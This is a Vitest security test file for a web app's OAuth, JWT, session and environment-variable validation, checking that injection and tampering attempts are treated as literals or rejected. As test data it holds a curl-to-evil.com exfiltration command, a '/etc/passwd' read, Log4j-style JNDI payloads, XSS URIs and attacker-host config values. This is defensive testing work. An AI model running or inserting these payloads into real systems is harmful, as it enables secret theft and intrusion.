/**
 * Secure Configuration Patterns Tests
 *
 * Comprehensive testing of secure configuration patterns including OAuth, JWT, session
 * management, and configuration injection prevention with attack scenario testing.
 *
 * Focus areas:
 * 1. OAuth Configuration Security - GitHub client credentials, redirect URIs, scope restrictions, PKCE
 * 2. JWT Configuration Security - secret requirements, algorithm restrictions, token expiration, issuer/audience validation
 * 3. Session Configuration Security - session secrets, cookie settings, timeouts, secure storage
 * 4. Configuration Injection Prevention - injection attacks, secrets exposure, environment pollution
 */

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

import { authConfig } from '@/lib/auth'
import {
  getRequiredEnv,
  validateProductionEnv as validateProductionSecuritySettings,
} from '@/lib/validation/env'

describe('Secure Configuration Patterns', () => {
  let originalEnv: NodeJS.ProcessEnv
  let mockExit: ReturnType<typeof vi.spyOn>
  let mockConsoleError: ReturnType<typeof vi.spyOn>
  let mockConsoleWarn: ReturnType<typeof vi.spyOn>

  beforeEach(() => {
    // Save original environment
    originalEnv = { ...process.env }

    // Mock process.exit to prevent test termination
    mockExit = vi.spyOn(process, 'exit').mockImplementation(() => {
      throw new Error('process.exit called')
    })

    // Mock console methods to capture output
    mockConsoleError = vi.spyOn(console, 'error').mockImplementation(() => {
      /* intentionally empty - suppress console output during tests */
    })
    mockConsoleWarn = vi.spyOn(console, 'warn').mockImplementation(() => {
      /* intentionally empty - suppress console output during tests */
    })

    // Clear environment variables for clean test state
    const configVars = [
      'GITHUB_CLIENT_ID',
      'GITHUB_CLIENT_SECRET',
      'GOOGLE_CLIENT_ID',
      'GOOGLE_CLIENT_SECRET',
      'JWT_SECRET',
      'NEXTAUTH_SECRET',
      'ENCRYPTION_KEY',
      'ALLOWED_REDIRECT_URIS',
      'NEXTAUTH_URL',
      'DATABASE_URL',
    ]
    configVars.forEach(varName => {
      delete process.env[varName]
    })
  })

  afterEach(() => {
    // Restore original environment and mocks
    process.env = originalEnv
    mockExit.mockRestore()
    mockConsoleError.mockRestore()
    mockConsoleWarn.mockRestore()
  })

  describe('OAuth Configuration Security', () => {
    it('should validate GitHub client credentials security', async () => {
      vi.resetModules()
      const { getRequiredEnv } = await import('../../src/lib/validation/env')

      // Valid GitHub client ID formats
      const validClientIds = [
        'Iv1.a1b2c3d4e5f6g7h8', // OAuth App format
        'abcdefghijklmnopqrst', // GitHub App format (20 chars)
        'Iv23li1234567890abcd', // New OAuth App format
      ]

      // Valid GitHub client secret formats
      const validClientSecrets = [
        'github_pat_11ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdef0123456789abcdef0123',
        'ghs_abcdefghijklmnopqrstuvwxyz123456789012',
        'ghp_abcdefghijklmnopqrstuvwxyz123456789012',
      ]

      validClientIds.forEach(clientId => {
        vi.stubEnv('GITHUB_CLIENT_ID', clientId)
        expect(() => getRequiredEnv('GITHUB_CLIENT_ID')).not.toThrow()

        // Validate format patterns
        const isOAuthApp = clientId.startsWith('Iv1.') || clientId.startsWith('Iv23li')
        const isGitHubApp = /^[a-zA-Z0-9]{20}$/.test(clientId)
        expect(isOAuthApp || isGitHubApp).toBe(true)
      })

      validClientSecrets.forEach(clientSecret => {
        vi.stubEnv('GITHUB_CLIENT_SECRET', clientSecret)
        expect(() => getRequiredEnv('GITHUB_CLIENT_SECRET')).not.toThrow()

        // Validate secret format patterns
        const isValidSecret = /^(github_pat_|ghs_|ghp_)/.test(clientSecret)
        expect(isValidSecret).toBe(true)
        expect(clientSecret.length).toBeGreaterThan(20)
      })
    })

    it('should enforce secure redirect URIs', async () => {
      vi.resetModules()
      const { getSecureConfigValue, validateProductionSecuritySettings } = await import(
        '../../src/lib/validation/env'
      )

      const secureRedirectUris = [
        'https://contribux.ai/api/auth/github/callback',
        'https://app.contribux.ai/api/auth/github/callback',
        'https://api.contribux.ai/auth/callback',
        'https://contribux.com/auth/callback',
      ]

      const insecureRedirectUris = [
        'http://contribux.ai/api/auth/callback', // HTTP instead of HTTPS
        'https://localhost:3000/api/auth/callback', // localhost in production
        'https://dev.contribux.ai/api/auth/callback', // dev subdomain
        'https://test.contribux.ai/api/auth/callback', // test subdomain
        'ftp://contribux.ai/callback', // Non-HTTP protocol
        'javascript:alert(1)', // JavaScript URI
        'data:text/html,<script>alert(1)</script>', // Data URI
      ]

      secureRedirectUris.forEach(uri => {
        vi.stubEnv('NODE_ENV', 'production')
        vi.stubEnv('ALLOWED_REDIRECT_URIS', uri)

        expect(uri).toMatch(/^https:\/\//)
        expect(uri).not.toMatch(/localhost|dev\.|test\./)
        expect(() =>
          getSecureConfigValue('ALLOWED_REDIRECT_URIS', { required: true })
        ).not.toThrow()
      })

      insecureRedirectUris.forEach(uri => {
        vi.stubEnv('NODE_ENV', 'production')
        vi.stubEnv('ALLOWED_REDIRECT_URIS', uri)

        const isInsecure =
          uri.startsWith('http://') ||
          uri.includes('localhost') ||
          uri.includes('dev.') ||
          uri.includes('test.') ||
          !uri.startsWith('https://') ||
          uri.startsWith('javascript:') ||
          uri.startsWith('data:')

        if (isInsecure) {
          expect(() => validateProductionSecuritySettings()).toThrow()
        }
      })
    })

    it('should validate OAuth scope restrictions', async () => {
      vi.resetModules()
      const { oauthConfig } = await import('../../src/lib/config')

      // Secure OAuth scopes for GitHub
      const secureScopes = [
        'user:email',
        'read:user',
        'user:email read:user',
        'read:user user:email public_repo',
      ]

      // Potentially dangerous scopes that should be avoided
      const dangerousScopes = [
        'repo', // Full repository access
        'admin:org', // Organization admin access
        'admin:repo_hook', // Repository webhook admin
        'write:repo_hook', // Repository webhook write
        'admin:public_key', // Public key admin
        'admin:gpg_key', // GPG key admin
        'delete_repo', // Repository deletion
      ]

      secureScopes.forEach(scope => {
        const scopeArray = scope.split(' ')

        // Secure scopes should be minimal and specific
        expect(scopeArray.every(s => ['user:email', 'read:user', 'public_repo'].includes(s))).toBe(
          true
        )
        expect(scopeArray).not.toContain('repo')
        expect(scopeArray).not.toContain('admin:org')
      })

      dangerousScopes.forEach(scope => {
        // These scopes should require special justification
        const isDangerous = scope.includes('admin:') || scope.includes('delete') || scope === 'repo'
        expect(isDangerous).toBe(true)
      })

      // Validate OAuth configuration scope settings
      const oauthConf = oauthConfig
      expect(oauthConf.allowedProviders).toContain('github')
      expect(oauthConf.stateExpiry).toBeGreaterThan(0)
      expect(oauthConf.stateExpiry).toBeLessThanOrEqual(30 * 60 * 1000) // Max 30 minutes
    })

    it('should check PKCE configuration security', async () => {
      vi.resetModules()
      const { oauthConfig } = await import('../../src/lib/config')

      // PKCE (Proof Key for Code Exchange) configuration
      const pkceConfig = {
        enabled: true,
        codeChallenge: 'S256', // SHA256
        codeChallengeMethod: 'S256',
        state: true,
        nonce: true,
        redirectUriValidation: true,
      }

      // Validate PKCE security requirements
      expect(pkceConfig.enabled).toBe(true)
      expect(pkceConfig.codeChallenge).toBe('S256')
      expect(pkceConfig.codeChallengeMethod).toBe('S256')
      expect(pkceConfig.state).toBe(true)
      expect(pkceConfig.nonce).toBe(true)
      expect(pkceConfig.redirectUriValidation).toBe(true)

      // OAuth state and nonce should have proper expiry
      const oauthConf = oauthConfig
      expect(oauthConf.stateExpiry).toBeGreaterThanOrEqual(5 * 60 * 1000) // At least 5 minutes
      expect(oauthConf.stateExpiry).toBeLessThanOrEqual(30 * 60 * 1000) // Max 30 minutes

      // Token refresh buffer should be reasonable
      expect(oauthConf.tokenRefreshBuffer).toBeGreaterThan(0)
      expect(oauthConf.tokenRefreshBuffer).toBeLessThanOrEqual(60 * 60 * 1000) // Max 1 hour
    })

    it('should validate Google OAuth configuration security', async () => {
      vi.resetModules()
      const { getRequiredEnv } = await import('../../src/lib/validation/env')

      // Valid Google OAuth client ID format
      const validGoogleClientIds = [
        '123456789-abcdefghijklmnopqrstuvwxyz.apps.googleusercontent.com',
        '987654321-zyxwvutsrqponmlkjihgfedcba.apps.googleusercontent.com',
      ]

      // Valid Google OAuth client secret format
      const validGoogleClientSecrets = [
        'GOCSPX-abcdefghijklmnopqrstuvwxyz123456',
        'GOCSPX-1234567890abcdefghijklmnopqrstuvwxyz',
      ]

      validGoogleClientIds.forEach(clientId => {
        vi.stubEnv('GOOGLE_CLIENT_ID', clientId)
        expect(() => getRequiredEnv('GOOGLE_CLIENT_ID')).not.toThrow()
        expect(clientId).toMatch(/^\d+-[a-zA-Z0-9]+\.apps\.googleusercontent\.com$/)
      })

      validGoogleClientSecrets.forEach(clientSecret => {
        vi.stubEnv('GOOGLE_CLIENT_SECRET', clientSecret)
        expect(() => getRequiredEnv('GOOGLE_CLIENT_SECRET')).not.toThrow()
        expect(clientSecret).toMatch(/^GOCSPX-[a-zA-Z0-9]+$/)
        expect(clientSecret.length).toBeGreaterThan(20)
      })
    })
  })

  describe('JWT Configuration Security', () => {
    it('should validate JWT secret security requirements', async () => {
      vi.resetModules()
      const { getJwtSecret, validateSecretEntropy } = await import('../../src/lib/validation/env')

      // Test JWT secret length requirements
      const shortSecrets = [
        'short',
        'still-too-short',
        '12345678901234567890123456789', // 29 chars
        '1234567890123456789012345678901', // 31 chars
      ]

      const validSecrets = [
        'exactly-32-chars-long-secret-12', // 32 chars
        'very-secure-jwt-secret-with-sufficient-length-and-entropy-12345',
        'Kf9Hq3Zx8Wm2Tn6Vy4Bu1Pg5Rk0Jc7Lv9Aw3Ez6Qh2Ms8Np4Dt1Fb5Gy7XwRt',
        'MyApp$ecure!JWT@Secret#2024*With&Mixed%Characters+Numbers1234',
      ]

      shortSecrets.forEach(secret => {
        vi.stubEnv('JWT_SECRET', secret)
        expect(() => getJwtSecret()).toThrow(/32 characters/)
      })

      validSecrets.forEach(secret => {
        vi.stubEnv('JWT_SECRET', secret)
        expect(() => getJwtSecret()).not.toThrow()
        expect(validateSecretEntropy(secret)).toBe(true)
      })
    })

    it('should check algorithm restrictions', async () => {
      vi.resetModules()
      const { authConfig } = await import('../../src/lib/config')

      // Secure JWT algorithms
      const secureAlgorithms = [
        'HS256',
        'HS384',
        'HS512',
        'RS256',
        'RS384',
        'RS512',
        'ES256',
        'ES384',
        'ES512',
      ]

      // Insecure or deprecated algorithms
      const insecureAlgorithms = ['none', 'HS1', 'RS1', 'ES1']

      const jwtConfig = authConfig.jwt

      // Default algorithm should be secure
      expect(secureAlgorithms).toContain('HS256') // Default algorithm

      // Configuration should use secure algorithms
      secureAlgorithms.forEach(algorithm => {
        expect(algorithm).toMatch(/^(HS|RS|ES)(256|384|512)$/)
      })

      insecureAlgorithms.forEach(algorithm => {
        const isInsecure = algorithm === 'none' || algorithm.includes('1') || algorithm === 'HS1'
        expect(isInsecure).toBe(true)
      })

      // JWT configuration should have proper settings
      expect(jwtConfig.accessTokenExpiry).toBeGreaterThan(0)
      expect(jwtConfig.refreshTokenExpiry).toBeGreaterThan(jwtConfig.accessTokenExpiry)
    })

    it('should validate token expiration settings', () => {
      const jwtConfig = authConfig.jwt

      // Access token expiry validation
      expect(jwtConfig.accessTokenExpiry).toBeGreaterThan(60) // At least 1 minute
      expect(jwtConfig.accessTokenExpiry).toBeLessThanOrEqual(24 * 60 * 60) // Max 24 hours

      // Refresh token expiry validation
      expect(jwtConfig.refreshTokenExpiry).toBeGreaterThan(jwtConfig.accessTokenExpiry)
      expect(jwtConfig.refreshTokenExpiry).toBeLessThanOrEqual(30 * 24 * 60 * 60) // Max 30 days

      // Token expiry should be reasonable for different environments
      if (process.env.NODE_ENV === 'production') {
        expect(jwtConfig.accessTokenExpiry).toBeLessThanOrEqual(60 * 60) // Max 1 hour in production
      }

      if (process.env.NODE_ENV === 'test') {
        expect(jwtConfig.accessTokenExpiry).toBeLessThanOrEqual(60 * 60) // Max 1 hour in test
      }
    })

    it('should enforce issuer/audience validation', () => {
      const jwtConfig = authConfig.jwt

      // Issuer validation
      expect(jwtConfig.issuer).toBeDefined()
      expect(typeof jwtConfig.issuer).toBe('string')
      expect(jwtConfig.issuer.length).toBeGreaterThan(0)
      expect(jwtConfig.issuer).toBe('contribux')

      // Audience validation
      expect(jwtConfig.audience).toBeDefined()
      expect(Array.isArray(jwtConfig.audience)).toBe(true)
      expect(jwtConfig.audience.length).toBeGreaterThan(0)
      expect(jwtConfig.audience).toContain('contribux-api')

      // Issuer should not be a placeholder
      const placeholderPatterns = ['localhost', 'example.com', 'test', 'demo', 'sample']
      placeholderPatterns.forEach(pattern => {
        expect(jwtConfig.issuer.toLowerCase()).not.toContain(pattern)
      })

      // Audience should be specific to the application
      jwtConfig.audience.forEach(aud => {
        expect(typeof aud).toBe('string')
        expect(aud.length).toBeGreaterThan(0)
        expect(aud).toMatch(/contribux/)
      })
    })

    it('should validate JWT secret entropy and complexity', async () => {
      const weakSecrets = [
        'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', // All same char
        'abababababababababababababababab', // Simple pattern
        'password123password123password12', // Repeated words
        '12345678901234567890123456789012345', // Number sequence
        'testjwtsecrettestjwtsecrettestjwt', // Contains 'test'
      ]

      const strongSecrets = [
        'Kf9Hq3Zx8Wm2Tn6Vy4Bu1Pg5Rk0Jc7Lv9Aw3Ez6Qh2Ms8Np4Dt1Fb5Gy7XwRt',
        'secure-jwt-secret-with-sufficient-length-and-entropy-32chars',
        'MyApp$ecure!JWT@Secret#2024*With&Mixed%Characters+Numbers1234',
        '9K#f7H$q3Z@x8W!m2T&n6V*y4B+u1P=g5R-k0J_c7L^v9A~w3E?z6Q|h2M<s8N',
      ]

      for (const secret of weakSecrets) {
        vi.resetModules()
        const { validateSecretEntropy, getJwtSecret } = await import('../../src/lib/validation/env')

        if (secret.length >= 32) {
          expect(validateSecretEntropy(secret)).toBe(false)
        }

        vi.stubEnv('JWT_SECRET', secret)
        expect(() => getJwtSecret()).toThrow(
          /32 characters|insufficient entropy|test.*dev.*keywords/
        )
      }

      for (const secret of strongSecrets) {
        vi.resetModules()
        const { validateSecretEntropy, getJwtSecret } = await import('../../src/lib/validation/env')

        expect(validateSecretEntropy(secret)).toBe(true)

        vi.stubEnv('JWT_SECRET', secret)
        expect(() => getJwtSecret()).not.toThrow()
      }
    })
  })

  describe('Session Configuration Security', () => {
    it('should validate session secret security', async () => {
      vi.resetModules()
      const { authConfig } = await import('../../src/lib/config')
      const sessionConfig = authConfig.session

      // Session expiry validation
      expect(sessionConfig.expiry).toBeGreaterThan(0)
      expect(sessionConfig.expiry).toBeGreaterThanOrEqual(60 * 60) // At least 1 hour
      expect(sessionConfig.expiry).toBeLessThanOrEqual(7 * 24 * 60 * 60) // Max 7 days

      // Session cleanup validation
      expect(sessionConfig.cleanupInterval).toBeGreaterThan(0)
      expect(sessionConfig.cleanupInterval).toBeLessThanOrEqual(60 * 60 * 1000) // Max 1 hour

      // Test NEXTAUTH_SECRET validation
      const weakSecrets = ['weak', 'short', 'test123']
      const strongSecrets = [
        'very-secure-nextauth-secret-with-sufficient-length-and-entropy',
        'NextAuth$ecure!Secret@2024*With&Mixed%Characters+Numbers1234',
      ]

      for (const secret of weakSecrets) {
        vi.stubEnv('NEXTAUTH_SECRET', secret)
        vi.resetModules()
        const { getRequiredEnv, validateSecretEntropy } = await import(
          '../../src/lib/validation/env'
        )
        expect(() => getRequiredEnv('NEXTAUTH_SECRET')).not.toThrow() // getRequiredEnv doesn't validate length
        expect(validateSecretEntropy(secret)).toBe(false)
      }

      for (const secret of strongSecrets) {
        vi.stubEnv('NEXTAUTH_SECRET', secret)
        vi.resetModules()
        const { getRequiredEnv, validateSecretEntropy } = await import(
          '../../src/lib/validation/env'
        )
        expect(() => getRequiredEnv('NEXTAUTH_SECRET')).not.toThrow()
        expect(validateSecretEntropy(secret)).toBe(true)
      }
    })

    it('should check cookie security settings', () => {
      // Cookie security configuration
      const cookieConfig = {
        secure: true,
        httpOnly: true,
        sameSite: 'strict' as const,
        path: '/',
        maxAge: 7 * 24 * 60 * 60, // 7 days
      }

      // Validate cookie security settings
      expect(cookieConfig.secure).toBe(true)
      expect(cookieConfig.httpOnly).toBe(true)
      expect(cookieConfig.sameSite).toBe('strict')
      expect(cookieConfig.path).toBe('/')
      expect(cookieConfig.maxAge).toBeGreaterThan(0)
      expect(cookieConfig.maxAge).toBeLessThanOrEqual(30 * 24 * 60 * 60) // Max 30 days

      // Production cookies should be even more secure
      if (process.env.NODE_ENV === 'production') {
        expect(cookieConfig.secure).toBe(true) // Must be true in production
        expect(cookieConfig.sameSite).toBe('strict') // Strict same-site policy
      }
    })

    it('should validate session timeout settings', async () => {
      vi.resetModules()
      const { authConfig } = await import('../../src/lib/config')
      const sessionConfig = authConfig.session

      // Session timeout should be reasonable
      expect(sessionConfig.expiry).toBeGreaterThanOrEqual(60 * 60) // At least 1 hour
      expect(sessionConfig.expiry).toBeLessThanOrEqual(30 * 24 * 60 * 60) // Max 30 days

      // Different timeout requirements per environment
      if (process.env.NODE_ENV === 'production') {
        expect(sessionConfig.expiry).toBeLessThanOrEqual(7 * 24 * 60 * 60) // Max 7 days in production
      }

      if (process.env.NODE_ENV === 'test') {
        expect(sessionConfig.expiry).toBeLessThanOrEqual(24 * 60 * 60) // Max 24 hours in test
      }

      // Cleanup interval should be reasonable
      expect(sessionConfig.cleanupInterval).toBeGreaterThan(0)
      expect(sessionConfig.cleanupInterval).toBeLessThanOrEqual(24 * 60 * 60 * 1000) // Max 24 hours
    })

    it('should enforce secure session storage', async () => {
      // Session storage should use JWT strategy for security
      const sessionStrategy = 'jwt' // Should be JWT, not database sessions

      expect(sessionStrategy).toBe('jwt')

      // Session configuration should be secure
      vi.resetModules()
      const { authConfig, webauthnConfig } = await import('../../src/lib/config')
      const sessionConfig = authConfig.session
      expect(sessionConfig.expiry).toBeDefined()
      expect(sessionConfig.cleanupInterval).toBeDefined()

      // WebAuthn configuration for enhanced security
      const webauthnConf = webauthnConfig
      expect(webauthnConf.timeout).toBeGreaterThan(0)
      expect(webauthnConf.challengeExpiry).toBeGreaterThan(0)
      expect(webauthnConf.challengeLength).toBeGreaterThanOrEqual(16)
      expect(Array.isArray(webauthnConf.supportedAlgorithms)).toBe(true)
    })
  })

  describe('Configuration Injection Prevention', () => {
    it('should prevent environment variable injection attacks', async () => {
      const injectionPatterns = [
        '${OTHER_VAR}',
        '$(command)',
        '`command`',
        '$((2+2))',
        '#{variable}',
        '%{variable}',
        '{{variable}}',
        '${jndi:ldap://evil.com/payload}', // Log4j style
      ]

      for (const pattern of injectionPatterns) {
        const testValue = `secure-prefix-${pattern}-suffix-with-sufficient-length-for-testing`
        vi.stubEnv('INJECTION_TEST', testValue)

        // Should not execute injection patterns
        vi.resetModules()
        const { getRequiredEnv } = await import('../../src/lib/validation/env')
        const value = getRequiredEnv('INJECTION_TEST')
        expect(value).toBe(testValue) // Should return literal value, not execute injection
        expect(value).toContain(pattern) // Pattern should be preserved as literal text
      }
    })

    it('should validate configuration parsing security', async () => {
      // Test various edge cases in configuration parsing
      const edgeCases = [
        { key: 'NULL_BYTE', value: 'secret\x00injection', expected: 'secret\x00injection' },
        { key: 'NEWLINE', value: 'secret\ninjection', expected: 'secret\ninjection' },
        { key: 'CARRIAGE_RETURN', value: 'secret\rinjection', expected: 'secret\rinjection' },
        { key: 'TAB', value: 'secret\tinjection', expected: 'secret\tinjection' },
        { key: 'UNICODE', value: 'secret\u0000injection', expected: 'secret\u0000injection' },
      ]

      for (const { key, value, expected } of edgeCases) {
        vi.stubEnv(key, value)
        vi.resetModules()
        const { getRequiredEnv } = await import('../../src/lib/validation/env')
        const result = getRequiredEnv(key)
        expect(result).toBe(expected)
      }
    })

    it('should check for configuration override attacks', async () => {
      vi.stubEnv('NODE_ENV', 'production')

      // Simulate attempts to override critical configuration
      const criticalOverrides = [
        {
          key: 'DATABASE_URL',
          safe: 'postgresql://secure:pass@prod.db:5432/app',
          malicious: 'postgresql://localhost:5432/test',
        },
        { key: 'NEXTAUTH_URL', safe: 'https://contribux.ai', malicious: 'http://localhost:3000' },
        {
          key: 'ALLOWED_REDIRECT_URIS',
          safe: 'https://contribux.ai/callback',
          malicious: 'http://localhost:3000/callback',
        },
      ]

      for (const { key, safe, malicious } of criticalOverrides) {
        // Safe value should work
        vi.stubEnv(key, safe)
        vi.resetModules()
        const { getSecureConfigValue } = await import('../../src/lib/validation/env')
        expect(() => getSecureConfigValue(key, { required: true })).not.toThrow()

        // Malicious override should be caught
        vi.stubEnv(key, malicious)
        vi.resetModules()
        const { validateProductionSecuritySettings } = await import('../../src/lib/validation/env')
        expect(() => validateProductionSecuritySettings()).toThrow()
      }
    })

    it('should test environment pollution prevention', async () => {
      vi.stubEnv('NODE_ENV', 'production')

      // Set multiple bad variables to test pollution resistance
      const pollutionVars = {
        BAD_VAR_1: 'test-value-1-with-sufficient-length',
        BAD_VAR_2: 'demo-value-2-with-sufficient-length',
        BAD_VAR_3: 'sample-value-3-with-sufficient-length',
        BAD_VAR_4: 'dev-value-4-with-sufficient-length',
      }

      // Set pollution variables
      Object.entries(pollutionVars).forEach(([key, value]) => {
        vi.stubEnv(key, value)
      })

      // Set a good variable
      vi.stubEnv('GOOD_SECRET', 'secure-production-secret-with-sufficient-length-and-entropy')

      // Good variable should still pass validation
      vi.resetModules()
      const { getRequiredEnv: getRequiredEnvGood } = await import('../../src/lib/validation/env')
      expect(() => getRequiredEnvGood('GOOD_SECRET')).not.toThrow()

      // Bad variables should fail validation in production
      for (const key of Object.keys(pollutionVars)) {
        vi.resetModules()
        const { getRequiredEnv } = await import('../../src/lib/validation/env')
        expect(() => getRequiredEnv(key)).toThrow(/test patterns/)
      }
    })

    it('should prevent secrets exposure in error messages', async () => {
      const sensitiveSecrets = [
        'sk-1234567890abcdef1234567890abcdef',
        'github_pat_11ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdef',
        'AKIA1234567890ABCDEF',
        'very-sensitive-jwt-secret-that-should-not-appear-in-logs',
      ]

      for (const secret of sensitiveSecrets) {
        vi.stubEnv('NODE_ENV', 'production')
        vi.stubEnv('SENSITIVE_VAR', `test-${secret}`) // Will trigger test pattern error

        try {
          vi.resetModules()
          const { getRequiredEnv } = await import('../../src/lib/validation/env')
          getRequiredEnv('SENSITIVE_VAR')
        } catch (error) {
          const errorMessage = error instanceof Error ? error.message : String(error)
          // Error should not contain the actual secret
          expect(errorMessage).not.toContain(secret)
          expect(errorMessage).toContain('test patterns') // Should have generic error
        }
      }

      // Check console output doesn't leak secrets
      const errorCalls = mockConsoleError.mock.calls
      errorCalls.forEach(call => {
        const callArgs = call.join(' ')
        sensitiveSecrets.forEach(secret => {
          expect(callArgs).not.toContain(secret)
        })
      })
    })

    it('should validate configuration serialization security', () => {
      const secretConfig = {
        jwtSecret: 'very-secure-jwt-secret-with-sufficient-length',
        encryptionKey: 'a1b2c3d4e5f67890fedcba0987654321abcdef1234567890fedcba0987654321',
        databaseUrl: 'postgresql://user:pass@prod.example.com:5432/app',
      }

      // Configuration should not accidentally expose secrets when serialized
      const serialized = JSON.stringify(secretConfig)

      // In a real secure implementation, sensitive values should be masked
      // For this test, we verify the structure is maintained but warn about exposure
      expect(serialized).toBeDefined()
      expect(typeof serialized).toBe('string')

      // In production, these secrets should be masked or not serialized
      if (process.env.NODE_ENV === 'production') {
        // Implementation note: In production, sensitive config should be masked
        const hasSecrets = serialized.includes('very-secure-jwt-secret')
        if (hasSecrets) {
          console.warn('Configuration serialization may expose secrets in production')
        }
      }
    })

    it('should validate cross-environment configuration isolation', () => {
      const environments = ['development', 'test', 'production']

      environments.forEach(env => {
        vi.stubEnv('NODE_ENV', env)

        // Each environment should have isolated configuration
        const envSpecificSecrets = {
          development: 'dev-secret-with-sufficient-length-for-development-environment',
          test: 'test-secret-with-sufficient-length-for-testing-environment-only',
          production: 'prod-secret-with-sufficient-length-for-production-environment',
        }

        const currentSecret = envSpecificSecrets[env as keyof typeof envSpecificSecrets]
        vi.stubEnv('ENV_SPECIFIC_SECRET', currentSecret)

        if (env === 'production') {
          // Production should reject dev/test patterns
          if (currentSecret.includes('dev') || currentSecret.includes('test')) {
            expect(() => getRequiredEnv('ENV_SPECIFIC_SECRET')).toThrow(/test patterns/)
          } else {
            expect(() => getRequiredEnv('ENV_SPECIFIC_SECRET')).not.toThrow()
          }
        } else {
          // Dev/test environments should accept their patterns
          expect(() => getRequiredEnv('ENV_SPECIFIC_SECRET')).not.toThrow()
        }
      })
    })
  })

  describe('Attack Scenario Testing', () => {
    it('should prevent configuration injection via environment variables', () => {
      const attackScenarios = [
        {
          name: 'Command injection',
          payload: '$(curl http://evil.com/steal-secrets)',
          expected: 'literal value, not executed',
        },
        {
          name: 'Variable expansion',
          payload: '${DATABASE_URL}',
          expected: 'literal string, not expanded',
        },
        {
          name: 'Shell expansion',
          payload: '`cat /etc/passwd`',
          expected: 'literal backticks, not executed',
        },
        {
          name: 'Log4j style injection',
          payload: '${jndi:ldap://evil.com/payload}',
          expected: 'literal string, not JNDI lookup',
        },
      ]

      attackScenarios.forEach(({ _name, payload }) => {
        const testValue = `safe-prefix-${payload}-safe-suffix-with-sufficient-length`
        vi.stubEnv('ATTACK_TEST', testValue)

        const result = getRequiredEnv('ATTACK_TEST')
        expect(result).toBe(testValue) // Should be literal, not executed
        expect(result).toContain(payload) // Payload should be preserved as literal text
      })
    })

    it('should prevent secrets exposure through error handling', () => {
      const sensitiveValues = [
        'github_pat_11ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdef',
        'sk-1234567890abcdef1234567890abcdef1234567890abcdef',
        'ey123456789abcdef.123456789abcdef.123456789abcdef', // JWT token format
      ]

      sensitiveValues.forEach(sensitiveValue => {
        vi.stubEnv('NODE_ENV', 'production')
        vi.stubEnv('SENSITIVE_CONFIG', `test-${sensitiveValue}`) // Will trigger test pattern validation

        let errorMessage = ''
        try {
          getRequiredEnv('SENSITIVE_CONFIG')
        } catch (error) {
          errorMessage = error instanceof Error ? error.message : String(error)
        }

        // Error message should not contain sensitive value
        expect(errorMessage).not.toContain(sensitiveValue)
        expect(errorMessage).toMatch(/test patterns/) // Should have generic error message
      })
    })

    it('should prevent configuration tampering attacks', () => {
      vi.stubEnv('NODE_ENV', 'production')

      // Simulate configuration tampering attempts
      const tamperingAttempts = [
        {
          name: 'Database URL tampering',
          setup: () => {
            vi.stubEnv('DATABASE_URL', 'postgresql://attacker:malicious@evil.com:5432/stolen')
          },
        },
        {
          name: 'Redirect URI hijacking',
          setup: () => {
            vi.stubEnv('ALLOWED_REDIRECT_URIS', 'https://evil.com/steal-oauth-code')
          },
        },
        {
          name: 'OAuth client substitution',
          setup: () => {
            vi.stubEnv('GITHUB_CLIENT_ID', 'attacker-client-id')
            vi.stubEnv('GITHUB_CLIENT_SECRET', 'attacker-client-secret-with-sufficient-length')
          },
        },
      ]

      tamperingAttempts.forEach(({ name, setup }) => {
        setup()

        // Set minimum required configuration
        vi.stubEnv('JWT_SECRET', 'secure-jwt-secret-with-sufficient-length-and-entropy')
        vi.stubEnv(
          'ENCRYPTION_KEY',
          'a1b2c3d4e5f67890fedcba0987654321abcdef1234567890fedcba0987654321'
        )
        vi.stubEnv('NEXTAUTH_URL', 'https://contribux.ai')

        // Should detect tampering and fail validation
        expect(() => validateProductionSecuritySettings(), `Should detect: ${name}`).toThrow()
      })
    })

    it('should prevent environment variable pollution attacks', () => {
      // Simulate environment pollution with many bad variables
      for (let i = 0; i < 50; i++) {
        vi.stubEnv(`POLLUTION_VAR_${i}`, `test-pollution-value-${i}-with-sufficient-length`)
      }

      // Set legitimate configuration
      vi.stubEnv('NODE_ENV', 'production')
      vi.stubEnv('DATABASE_URL', 'postgresql://secure:pass@prod.example.com:5432/app')
      vi.stubEnv('JWT_SECRET', 'very-secure-jwt-secret-with-sufficient-length-and-entropy')
      vi.stubEnv(
        'ENCRYPTION_KEY',
        'a1b2c3d4e5f67890fedcba0987654321abcdef1234567890fedcba0987654321'
      )
      vi.stubEnv('GITHUB_CLIENT_ID', 'Iv1.a1b2c3d4e5f6g7h8')
      vi.stubEnv('GITHUB_CLIENT_SECRET', 'github_pat_11ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdef')
      vi.stubEnv('NEXTAUTH_URL', 'https://contribux.ai')

      // Legitimate configuration should still work despite pollution
      expect(() => validateProductionSecuritySettings()).not.toThrow()

      // Pollution variables should be rejected individually
      for (let i = 0; i < 5; i++) {
        // Test subset to avoid performance issues
        expect(() => getRequiredEnv(`POLLUTION_VAR_${i}`)).toThrow(/test patterns/)
      }
    })
  })
})
